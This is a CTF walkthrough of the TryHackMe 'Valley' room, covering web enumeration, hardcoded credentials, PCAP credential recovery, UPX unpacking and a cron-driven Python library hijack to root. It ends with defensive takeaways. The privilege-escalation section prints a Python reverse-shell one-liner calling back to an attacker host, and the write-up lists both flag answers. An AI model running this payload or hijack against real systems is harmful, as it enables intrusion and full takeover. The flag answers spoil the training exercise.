# [Valley](https://tryhackme.com/room/valleype)

| Field      | Details                          |
|------------|----------------------------------|
| Room       | [Valley](https://tryhackme.com/room/valleype) |
| Platform   | TryHackMe                        |
| Difficulty | Easy                               |
| Category   | Web Exploitation, OSINT, Network Forensics, Privilege Escalation |
| Tags       | Hidden Endpoints, Hardcoded Credentials, Password Reuse, PCAP Analysis, Python Library Hijacking |

---

## Overview

*"Can you find your way into the Valley?"* Turns out yes, mostly because Valley Inc., a photography company with big "we do headshots and sunset shoots" energy, left its developer notes sitting in the same folder as its stock photos. Nothing says professional portfolio like accidentally publishing your dev credentials next to a picture of a golden retriever at golden hour.

This box doesn't need an exploit database entry. It needs you to actually read the gallery source code, notice a suspiciously numbered file that doesn't belong, and follow a trail of hardcoded secrets, reused passwords, and a suspiciously UPX-packed binary called (checks notes) `valleyAuthenticator`, straight through to root. Somebody at Valley Inc. really believes in "security through obscurity," and by "believes in" I mean "has heard the phrase once."

```
Attack surface
┌─────────────────────────────────────┐
│  22/tcp    – SSH                       │
│  80/tcp    – HTTP (Valley photography  │
│              site: gallery + pricing)   │
│  37370/tcp – FTP (definitely not 21,   │
│              very sneaky, very cute)    │
└─────────────────────────────────────┘
```

---

## Enumeration

### Initial Scan

```bash
nmap -sC -sV -T4 <TARGET_IP>
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp    open  http    Apache httpd 2.4.41 (Ubuntu)
37370/tcp open  ftp     vsftpd 3.0.3
```

FTP is alive and well, just relocated to port 37370 instead of the usual 21, presumably in the world's least effective disguise. Someone at Valley moved the furniture around but left the front door unlocked.

### Poking the Website

Port 80 serves an actual Valley Inc. photography site, complete with a `/gallery` page and a `/pricing` page. The gallery images are named in a clean numerical sequence, `1`, `2`, `3`, and so on, which is the kind of tidy naming convention that makes an out-of-sequence file stick out like a wedding photographer at a crime scene.

Viewing the gallery's source code reveals a `/static` directory backing the images. Running Gobuster against both `/` and `/static` confirms the numbered image files, but one entry doesn't fit the pattern at all: **`/static/00`**. Every other file starts at 1. Somebody's index is off by one, and that's exactly the kind of inconsistency this room rewards you for noticing.

```
Enumeration chain
┌───────────────────────────────────────────┐
│  Gallery source ──► /static directory        │
│         │                                     │
│  Gobuster on /static ──► numbered images       │
│         │           ──► /00 (odd one out)      │
└───────────────────────────────────────────┘
```

Visiting `/static/00` turns up a developer note rather than a photo, one clearly never meant for public eyes, referencing a hidden path along the lines of `/dev<something>`. Someone left a Post-it note taped to the outside of the building.

---

## Initial Access

### Finding the Dev Login

The hinted path leads to a login panel, no visible credentials, no obvious default combo working (`admin:admin` gets you nowhere, and neither does an SQL injection attempt, so at least the login form itself isn't a total disaster). But the page's source code links to a `dev.js` file, and dev.js has never met a secret it didn't hardcode directly into client-side JavaScript.

Sure enough, `dev.js` contains a hardcoded username and password, plus a redirect to a `dev*.txt` file that only shows up after a successful login. Except, of course, "only shows up after login" is a client-side promise, and client-side promises are the honor system of web security. The text file is reachable directly, no login required, because Valley's authentication check apparently trusts the browser to behave itself.

```
Client-side auth bypass
┌────────────────────────────────────────────┐
│  /static/00 ──► hints at hidden dev login       │
│         │                                       │
│  Login page source ──► dev.js                    │
│         │                                       │
│  dev.js ──► hardcoded creds + gated dev*.txt        │
│         │                                       │
│  dev*.txt fetched directly, login skipped entirely │
└────────────────────────────────────────────┘
```

The dev note points at reusing those same credentials elsewhere, on FTP and SSH specifically, which is either an efficient password policy or the total absence of one.

### Credential Reuse, Round One

The hardcoded creds don't work against SSH, but FTP (remember, relocated to port **37370**) accepts them without complaint:

```bash
ftp <TARGET_IP> 37370
```

Inside, a `dir` turns up a handful of `.pcapng` capture files, which is a delightfully on-brand thing for a "network forensics" wing of this challenge to just leave sitting in an FTP share like leftover pizza.

```bash
mget *.pcapng
```

### Digging Through the Captures

Loading the captures into Wireshark, the FTP capture shows an earlier login that no longer works, a dead end, RIP. The first HTTP capture is mostly encrypted noise. But the second HTTP capture, filtered down to POST requests, reveals a clear-text login submission carrying a fresh set of credentials.

```
PCAP forensics chain
┌───────────────────────────────────────────┐
│  FTP creds ──► download .pcapng captures      │
│         │                                      │
│  siemFTP.pcapng ──► stale creds, dead end        │
│  siemHTTP1.pcapng ──► nothing useful              │
│  siemHTTP2.pcapng ──► POST request ──► fresh creds │
└───────────────────────────────────────────┘
```

Trying that second set against SSH lands cleanly:

```bash
ssh <recovered_user>@<TARGET_IP>
```

Foothold achieved, and the user flag is sitting right there in the home directory, waiting for absolutely no fanfare.

```
Answer 1 — User flag: THM{k@l1_1n_th3_v@lley}
```

---

## Escalating Privileges

### The Cron Job That Almost Wasn't a Problem

`sudo -l` comes back empty, no free sudo rights this time, Valley Inc. did at least one thing correctly. But `/etc/crontab` shows a Python script, `photosEncrypt.py`, running as root on a timer. This is the kind of detail a defender should treat as a five-alarm fire and a CTF box treats as a welcome mat.

Unfortunately, `photosEncrypt.py` itself is root-owned and not writable, no direct edit possible. It does, however, import Python's `base64` module, and that import is the loose thread.

```
Cron privesc setup
┌───────────────────────────────────────────┐
│  crontab ──► root-run photosEncrypt.py         │
│         │                                       │
│  script imports base64 ──► base64.py writable?     │
│         │                                       │
│  Nope — only root + valleyAdmin group can write     │
└───────────────────────────────────────────┘
```

`base64.py` is only writable by root and members of the `valleyAdmin` group, and the current low-privilege user is neither. Time to move sideways.

### Meet valleyAuthenticator

The home directory turns up another user, `valley`, and a binary called `valleyAuthenticator`, which is a wonderfully unsubtle name for a file that turns out to hold the keys to that very account. Serving it off the box with a quick Python HTTP server and grabbing it locally:

```bash
# on target
python3 -m http.server <PORT>

# on attacker box
wget http://<TARGET_IP>:<PORT>/valleyAuthenticator
```

Running `strings` against it shows a mix of gibberish and readable text, the gibberish being the tell that the binary is packed with UPX. Unpacking it:

```bash
upx -d valleyAuthenticator
```

...and running `strings` again on the unpacked version surfaces a welcome banner and, more usefully, two hardcoded MD5 hashes sitting in plain text. Valley Inc.'s idea of "weak cryptography" turns out to be "cryptography, technically."

```
valleyAuthenticator chain
┌───────────────────────────────────────────┐
│  valleyAuthenticator ──► UPX packed             │
│         │                                       │
│  upx -d ──► unpacked binary                        │
│         │                                       │
│  strings ──► hardcoded MD5 hashes                  │
│         │                                       │
│  Cracked ──► password for user `valley`             │
└───────────────────────────────────────────┘
```

Cracking those hashes hands over a working password for the `valley` account, and logging in as `valley` finally puts us in the `valleyAdmin` group.

### Hijacking base64.py

With `valleyAdmin` group membership, `base64.py` is now writable. Since `photosEncrypt.py` imports it and runs as root every minute via cron, overwriting `base64.py` with a reverse shell payload means root will hand-deliver a shell on the next tick:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

With a listener running and waiting patiently:

```bash
nc -lnvp <PORT>
```

...root shows up within the minute, as promised, because that's just how cron works, it doesn't care whose shellcode it's running as long as it's on schedule.

```
Answer 2 — Root flag: THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
```

```
Library hijack privesc
┌───────────────────────────────────────────┐
│  valley ──► valleyAdmin group                   │
│         │                                       │
│  base64.py now writable ──► reverse shell payload   │
│         │                                       │
│  root cron runs photosEncrypt.py every minute      │
│         │                                       │
│  base64 import triggers payload ──► root shell     │
└───────────────────────────────────────────┘
```

---

## Investigation Summary

```
[nmap scan]
  │
  └─ 22/ssh, 80/http, 37370/ftp (relocated)
         │
[Gallery source] ──► /static ──► /static/00 (odd file out)
         │
[Dev note] ──► hidden dev login path
         │
[dev.js] ──► hardcoded creds + client-side-only gate
         │
[dev*.txt fetched directly] ──► creds confirmed reusable
         │
[FTP login] ──► .pcapng captures downloaded
         │
[Wireshark] ──► siemHTTP2.pcapng ──► fresh POST creds
         │
[SSH login] ──► user flag
         │
[crontab] ──► photosEncrypt.py (root, unwritable)
         │           imports base64 (also unwritable, yet)
         │
[valleyAuthenticator] ──► UPX unpack ──► MD5 hashes ──► valley's password
         │
[valley account] ──► valleyAdmin group ──► base64.py now writable
         │
[Cron fires] ──► reverse shell as root ──► root flag
```

---

## Flags

| # | Question    | Answer                                          |
|---|-------------|--------------------------------------------------|
| 1 | User flag   | `THM{k@l1_1n_th3_v@lley}`                          |
| 2 | Root flag   | `THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}`               |

**Would I recommend this room?** Absolutely. It's a genuinely fun chain, source-code snooping, a client-side auth bypass that shouldn't work but does, PCAP forensics, and a Python library hijack via a root cron job, all stitched together without ever needing a memorized CVE. Great room for practicing the habit of reading everything twice before assuming a dead end is actually dead.

---

## Blue Team Takeaways

**Client-Side Checks Are Not Access Control**
The dev panel's "log in, then get redirected to the secret file" flow lived entirely in the browser, so the secret file was never actually protected, just politely hidden behind a door with no lock. Any authorization decision that matters has to be enforced server-side; if a client can be told "no" and just... not listen, it will.

**Hardcoded Credentials Don't Stay Hidden in Shipped Code**
`dev.js` handed over working credentials the moment anyone bothered to view-source the page. Anything sent to a browser is public, full stop, regardless of how deeply it's nested in a JS file nobody was supposed to look at. Secrets belong in a vault or environment config on the server, never in code the client can download.

**Password Reuse Turns One Leak Into a Chain of Leaks**
The same style of hardcoded credential kept working across FTP, and reused credentials showed up again inside old PCAP captures. Once one password leaks, every service sharing it is compromised too. Unique credentials per service, plus rotation after any suspected exposure, would have shut this chain down after step one.

**Unencrypted Network Captures Are a Time Capsule of Secrets**
Old `.pcapng` files sitting on an FTP share preserved a clear-text HTTP POST login from who-knows-when, valid long after anyone should have expected it to matter. Captured traffic should never be stored casually, and clear-text credential submission over HTTP shouldn't exist in a system with any password to protect in the first place — TLS everywhere, no exceptions.

**"Obfuscated" Isn't the Same as "Secure"**
Packing a binary with UPX slowed down a `strings` dump by exactly one extra command. The hardcoded MD5 hashes inside were just as crackable once unpacked as if they'd been sitting in plain text from the start. Obfuscation buys time, not security, and MD5 for anything password-related buys almost none of either.

**Group Membership Is a Privilege Boundary, Treat It Like One**
Landing in the `valleyAdmin` group suddenly made a root-imported library writable, which is precisely the kind of quiet, cascading privilege a group membership audit should catch before an attacker does. Any group that grants write access to something root touches on a schedule needs the same scrutiny as sudo rights.

---

*Valley Inc. really said "we do landscapes, portraits, and apparently unintentional privilege escalation," and somehow the last one is the only shoot that went off without a hitch.*
